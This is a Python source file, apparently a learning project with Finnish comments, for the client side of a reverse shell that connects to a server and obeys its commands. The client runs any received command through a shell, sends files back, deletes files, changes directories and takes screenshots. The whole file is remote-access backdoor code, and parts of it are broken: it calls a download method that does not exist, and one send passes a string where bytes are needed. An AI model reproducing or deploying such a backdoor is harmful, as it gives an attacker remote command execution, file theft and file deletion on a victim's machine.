import socket
import subprocess
import os
import pyautogui

from main_server import MainServer

class MainClient:
    def __init__(self, ip:str, port:int):
        self.ip = ip
        self.port = port
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.connect((self.ip, self.port))
        

    
    def delete(self, s, command):
        s = self.s
        filename = command.split()[1]
        if os.path.exists(filename):
            os.remove(filename)
            s.send(b'file deleted')
        else:
            s.send(b'file not found')

    def upload(self, s,command):
        s = self.s
        filename = command.split()[1]
        if os.path.exists(filename):
            with open(filename, 'rb') as f:
                bits = f.read(1024)
                while len(bits) > 0:
                    s.send(bits)
                    bits = f.read(1024)
                s.send(b'DONE')
        else:
            s.send('File not found')

    def change_dir(self, s,command):
        #splitataan välilyönneistä ja otetaan indeksi 1 talteen
        s = self.s
        path = command.split()[1]
        #jos polku löytyy vaihdetaan dirri käyttäen os modulin chdir functiota
        if os.path.exists(path):
            os.chdir(path)
            s.send(f'Directory changed to {os.getcwd()}'.encode())
        #jos ei löydy niin ilmoitetaan serverille
        else:
            s.send(b'Invalid directory name')

    def run_command(self, s, command):
        s = self.s
        # käytetään subprocessin run functiota. 
        # tarvitaan shelli sekä halutaan ottaa tulos talteen -> capture_output
        result = subprocess.run(command, shell=True, capture_output=True)
        # tulos on standard outputissa. virheet läytyvät result.stderrorista
        # eli jos oli virheellinen komento saadaan näytölle virheilmoitus eikä ohjelma kaadu
        if result.returncode == 0:
            s.send(result.stdout)
        else:
            s.send(b'Invalid command')

    def main(self):        
        s = self.s
        while True:
            #otetaan käsky talteen. 1kilotavu riittää. decodtaan bytet takaisin stringeiksi
            command = self.s.recv(4096).decode('ISO-8859-1')
            if command == 'exit':
                self.s.close()
                break
            elif command.startswith('cd') and len(command) > 3:
                self.change_dir(s,command)
            elif command.startswith('download'):
                self.download(s,command)
            elif command == 'screen':
                screenshot = pyautogui.screenshot()
                screenshot.save("screenshot.png")
            elif command.startswith('del'):
                self.delete(s,command)
            # elif command.startswith('upload'):
            #     upload(s,command)
            #     continue
            else:
                #ajetaan komento sekä lähetetään tulos serverille. 
                self.run_command(s,command)
                


if __name__ == '__main__':
    appi = MainClient('127.0.0.1', 8888)
    appi.main()